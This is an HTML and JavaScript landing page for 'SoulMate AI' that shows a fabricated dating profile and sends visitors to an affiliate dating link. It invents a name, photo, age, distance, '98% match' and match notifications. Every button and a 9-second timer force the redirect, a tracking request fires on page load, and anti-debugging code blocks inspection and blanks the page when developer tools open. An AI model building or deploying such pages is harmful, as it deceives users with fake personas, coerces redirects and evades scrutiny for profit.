<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Crush Found - SoulMate AI</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💜</text></svg>">
    <style>
        /* --- RESET & VARIABLES --- */
        :root {
            --primary: #7b2cbf;
            --secondary: #3a0ca3;
            --accent: #4cc9f0;
            --dark: #10002b;
            --glass: rgba(20, 20, 35, 0.75);
            --border: rgba(255, 255, 255, 0.1);
        }
        
        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;user-select:none;}
        
        body{
            font-family: 'Poppins', sans-serif;
            background-color: var(--dark);
            color:#fff;
            height:100vh;
            width:100vw;
            overflow:hidden;
            position:relative;
        }

        /* --- BACKGROUND VIDEO --- */
        .video-bg{
            position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;object-fit:cover;
            filter: brightness(0.4) blur(3px);
            transition: opacity 0.5s;
        }
        .fallback-bg{
            position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;
            background: linear-gradient(135deg, #240046 0%, #10002b 100%);
        }

        /* --- BOTTOM SHEET CONTAINER --- */
        .sheet-container{
            position:absolute;bottom:0;left:0;width:100%;height:100%;
            display:flex;flex-direction:column;justify-content:flex-end;z-index:10;
        }

        .bottom-sheet{
            width:100%;
            max-width:500px;
            margin:0 auto;
            background: var(--glass);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-top: 1px solid var(--border);
            border-radius: 30px 30px 0 0;
            padding: 25px 20px 40px 20px;
            box-shadow: 0 -10px 40px rgba(0,0,0,0.6);
            transform: translateY(100%);
            animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards 0.3s;
            position:relative;
        }

        /* Drag Handle Bar */
        .drag-handle{
            width:50px;height:5px;background:rgba(255,255,255,0.2);
            border-radius:10px;margin:0 auto 20px auto;
        }

        @keyframes slideUp{
            to{transform:translateY(0);}
        }

        /* --- PROFILE HEADER (SCANNING EFFECT) --- */
        .scan-wrapper{
            position:relative;
            width:140px;height:140px;
            margin:0 auto 20px auto;
        }
        
        .profile-img{
            width:100%;height:100%;border-radius:50%;object-fit:cover;
            border:3px solid rgba(255,255,255,0.1);
            box-shadow:0 0 30px rgba(123, 44, 191, 0.4);
        }

        .scan-ring{
            position:absolute;top:-5px;left:-5px;right:-5px;bottom:-5px;
            border-radius:50%;
            border:2px solid transparent;
            border-top-color: var(--accent);
            border-bottom-color: var(--primary);
            animation:spin 2s linear infinite;
        }

        .scan-line{
            position:absolute;top:0;left:0;width:100%;height:4px;
            background:var(--accent);
            box-shadow:0 0 10px var(--accent);
            animation:scan 2s ease-in-out infinite;
            border-radius:2px;
            opacity:0.8;
        }

        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        @keyframes scan{0%{top:10%;opacity:0;}50%{opacity:1;}100%{top:90%;opacity:0;}}

        /* --- TEXT INFO --- */
        .user-info{text-align:center;margin-bottom:25px;}
        .user-name{font-size:28px;font-weight:700;background: linear-gradient(to right, #fff, #bde0fe); -webkit-background-clip: text; -webkit-text-fill-color: transparent;}
        .user-bio{font-size:13px;color:rgba(255,255,255,0.7);margin-top:5px;}
        
        .tags{display:flex;justify-content:center;gap:8px;margin-top:10px;flex-wrap:wrap;}
        .tag{background:rgba(255,255,255,0.1);padding:4px 12px;border-radius:20px;font-size:11px;color:var(--accent);border:1px solid rgba(76, 201, 240, 0.2);}

        /* --- ACTION GRID --- */
        .action-grid{
            display:grid;
            grid-template-columns: 1fr 1.5fr 1fr;
            gap:15px;
            align-items:center;
            margin-bottom:25px;
        }

        .icon-btn{
            width:50px;height:50px;
            border-radius:18px;
            background:rgba(255,255,255,0.05);
            border:1px solid var(--border);
            color:#fff;
            font-size:18px;
            display:flex;align-items:center;justify-content:center;
            transition:all 0.2s;
            cursor:pointer;
        }
        .icon-btn:active{transform:scale(0.9);background:rgba(255,255,255,0.1);}

        /* --- MAIN BUTTON (PULSE) --- */
        .main-cta{
            background: linear-gradient(135deg, var(--secondary), var(--primary));
            border:none;
            width:100%;
            padding:18px;
            border-radius:16px;
            color:white;
            font-weight:600;
            font-size:17px;
            display:flex;align-items:center;justify-content:center;gap:10px;
            box-shadow:0 10px 25px rgba(123, 44, 191, 0.4);
            position:relative;
            overflow:hidden;
            cursor:pointer;
            transition: transform 0.2s;
        }
        .main-cta:active{transform:scale(0.97);}
        
        .pulse-wave{
            position:absolute;top:50%;left:50%;width:100%;height:100%;background:rgba(255,255,255,0.2);
            border-radius:16px;transform:translate(-50%,-50%) scale(0);opacity:0;
            pointer-events:none;
        }
        .main-cta.animate .pulse-wave{
            animation: pulseWave 1.5s infinite;
        }

        @keyframes pulseWave{
            0%{transform:translate(-50%,-50%) scale(1);opacity:0.6;}
            100%{transform:translate(-50%,-50%) scale(1.8);opacity:0;}
        }

        /* --- FOOTER & TOAST --- */
        .secure-note{
            text-align:center;font-size:10px;color:rgba(255,255,255,0.4);margin-top:15px;
            display:flex;align-items:center;justify-content:center;gap:5px;
        }

        .toast-container{
            position:fixed;top:20px;left:50%;transform:translateX(-50%);
            z-index:100;display:flex;flex-direction:column;gap:10px;width:90%;max-width:350px;pointer-events:none;
        }
        
        .toast-card{
            background:rgba(20, 20, 30, 0.9);
            backdrop-filter:blur(10px);
            border-left:4px solid var(--accent);
            padding:12px 15px;
            border-radius:8px;
            box-shadow:0 5px 15px rgba(0,0,0,0.5);
            display:flex;align-items:center;gap:12px;
            transform:translateX(-120%);transition:transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            pointer-events:auto;
        }
        .toast-card.show{transform:translateX(0);}
        .toast-icon{color:var(--accent);font-size:18px;}
        .toast-text h4{font-size:13px;font-weight:600;margin-bottom:2px;}
        .toast-text p{font-size:11px;color:rgba(255,255,255,0.6);}

        /* --- UTILS --- */
        .hidden{display:none !important;}
        .blur-anim{animation: blurIn 2s infinite alternate;}
        @keyframes blurIn{from{filter:blur(2px);}to{filter:blur(0px);}}

    </style>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

    <!-- Background -->
    <div class="fallback-bg"></div>
    <video class="video-bg" id="bgVideo" autoplay muted loop playsinline preload="auto"></video>

    <!-- Toast Notifications -->
    <div class="toast-container" id="toastContainer"></div>

    <!-- Main Content Wrapper -->
    <div class="sheet-container">
        <div class="bottom-sheet">
            <div class="drag-handle"></div>

            <!-- Scanning Profile Section -->
            <div class="scan-wrapper">
                <div class="scan-ring"></div>
                <div class="scan-line"></div>
                <img id="profilePhoto" class="profile-img" src="" alt="Profile">
            </div>

            <!-- Info -->
            <div class="user-info">
                <h2 class="user-name" id="userName">Searching...</h2>
                <p class="user-bio">Verified Profile • Active Now</p>
                <div class="tags">
                    <span class="tag"><i class="fas fa-map-marker-alt"></i> < 1 km</span>
                    <span class="tag" id="tagAge">23 y.o.</span>
                    <span class="tag" style="border-color:var(--primary);color:#fff;">98% Match</span>
                </div>
            </div>

            <!-- Action Grid -->
            <div class="action-grid">
                <div class="icon-btn" onclick="handleClick()"><i class="fas fa-times"></i></div>
                <button class="main-cta animate" id="mainButton">
                    <div class="pulse-wave"></div>
                    <i class="fab fa-whatsapp"></i> 
                    <span>Connect Now</span>
                </button>
                <div class="icon-btn" onclick="handleClick()"><i class="fas fa-star"></i></div>
            </div>

            <!-- Footer -->
            <div class="secure-note">
                <i class="fas fa-lock"></i> AI Encrypted Connection
            </div>
        </div>
    </div>

    <script>
        // --- 1. SECURITY & ANTI-DEBUG (PRESERVED) ---
        document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
        document.addEventListener('keydown', e => {
            if([123,73,74,67,86,88,65,83,80,85].includes(e.keyCode) || (e.ctrlKey && [73,74,67,86,88,65,83,80,85].includes(e.keyCode))) {
                e.preventDefault(); return false;
            }
        });
        
        // Devtools detector
        setInterval(function() {
            if(window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
                window.location.replace("about:blank");
            }
        }, 500);

        console.clear();
        setInterval(() => {
            console.clear();
            console.log("%cSystem Secured 🔒", "color: #4cc9f0; font-size: 30px; font-weight: bold;");
        }, 1000);


        // --- 2. CONFIGURATION (PRESERVED LOGIC) ---
        const SMARTLINK = "https://zokxjg.datingllove.com/?utm_source=da57dc555e50572d&ban=inst&j5=1&j6=1&s1=188302&s2=2150610&s3=PATRICK&click_id=PATRICK"; 
        let TARGET_URL = SMARTLINK;

        // Assets
        const profilePhotos = [
            "https://files.catbox.moe/blc5hs.png", 
            "https://files.catbox.moe/pjlwxp.jpg",
            "https://files.catbox.moe/p8q9ys.jpg",
            "https://files.catbox.moe/0y1tmh.jpg"
        ];

        const videoList = [
            "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
            "https://files.catbox.moe/y2fr1u.mp4",
            "https://files.catbox.moe/jytnih.mp4",
            "https://files.catbox.moe/1q99k0.mp4"
        ];

        const names = ["Sarah","Jessica","Emily","Sophia","Olivia","Emma","Ava","Isabella","Mia","Charlotte","Amelia","Harper","Evelyn","Abigail","Elizabeth","Diana","Kate","Anna","Luna","Bella"];
        
        function getRandomItem(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
        function getRandomInt(min, max){ return Math.floor(Math.random() * (max - min + 1)) + min; }

        // URL Parameter Handler
        const params = new URLSearchParams(window.location.search);
        let finalUrl = TARGET_URL + (params.toString() ? (TARGET_URL.includes('?') ? '&' : '?') + params.toString() : '');


        // --- 3. LOGIC FUNCTIONS ---

        // Redirect
        function doRedirect() { location.href = finalUrl; }

        // Video Handler
        const videoEl = document.getElementById('bgVideo');
        let videoIdx = 0;

        function playVideo() {
            videoEl.src = videoList[videoIdx];
            videoEl.play().catch(() => nextVideo());
            videoEl.onerror = nextVideo;
        }

        function nextVideo() {
            videoIdx = (videoIdx + 1) % videoList.length;
            if(videoIdx !== 0) playVideo();
        }

        // Custom Toast Function (New Design)
        function showToast(title, msg, icon = 'fa-bell') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = 'toast-card';
            toast.innerHTML = `
                <i class="fas ${icon} toast-icon"></i>
                <div class="toast-text">
                    <h4>${title}</h4>
                    <p>${msg}</p>
                </div>
            `;
            container.appendChild(toast);
            
            // Trigger animation
            setTimeout(() => toast.classList.add('show'), 10);

            // Remove
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => toast.remove(), 400);
            }, 3500);
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            // Tracking
            fetch('https://imopol.dasboardkramat.workers.dev/track?cid=PATRICK', { method: 'GET', keepalive: true });

            // Setup Video
            videoIdx = getRandomInt(0, videoList.length - 1);
            playVideo();

            // Setup Content
            document.getElementById('userName').textContent = getRandomItem(names);
            document.getElementById('profilePhoto').src = getRandomItem(profilePhotos);
            document.getElementById('tagAge').textContent = getRandomInt(20, 28) + " y.o.";

            // Interaction Logic
            const btn = document.getElementById('mainButton');
            
            window.handleClick = function() {
                btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Connecting...';
                btn.style.opacity = '0.7';
                setTimeout(doRedirect, 800);
            };

            btn.onclick = window.handleClick;
            
            // Interaction for video play (Mobile)
            document.body.onclick = () => {
                if(videoEl.paused) videoEl.play().catch(()=>{});
            };

            // Simulate Incoming Toasts
            setTimeout(() => {
                showToast("New Match", "Someone nearby viewed your profile!");
            }, 1500);

            setTimeout(() => {
                showToast("Popular", "You are in the top 5% today!", "fa-fire");
            }, 4500);
        });

        // Auto Redirect Timer (Still 6 Seconds)
        setTimeout(() => { doRedirect(); }, 9000);

    </script>
</body>
</html>
